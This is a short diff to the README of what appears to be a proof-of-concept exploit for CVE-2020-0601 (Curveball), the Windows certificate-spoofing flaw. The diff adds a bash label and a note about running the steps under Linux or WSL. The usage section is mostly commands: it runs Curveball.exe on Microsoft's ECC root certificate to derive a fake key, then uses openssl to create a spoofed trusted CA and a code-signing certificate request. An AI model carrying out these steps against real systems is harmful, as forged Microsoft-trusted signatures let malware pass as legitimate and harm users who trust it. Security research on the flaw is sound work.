@@ -5,8 +5,9 @@ A PoC for [CVE-2020-0601](https://portal.msrc.microsoft.com/en-US/security-guida
 Clone the repository and open it in Visual Studio 2019. Switch to Release and compile it. You can find prebuilt binaries [here]().
 
 ## Usage
-```
+```bash
 .\Curveball.exe MicrosoftECCProductRootCertificateAuthority.cer MicrosoftECCProductRootCertificateAuthority_fake.key
+# in linux bash (you can also use Windows but you'd have to get an alternative for osslsigncode). WSL on Windows works fine.
 openssl req -new -x509 -key MicrosoftECCProductRootCertificateAuthority_fake.key -out trusted_ca.crt
 openssl ecparam -name secp384r1 -genkey -noout -out cert.key
 openssl req -new -key cert.key -out cert.csr -config openssl.conf -reqexts v3_cs
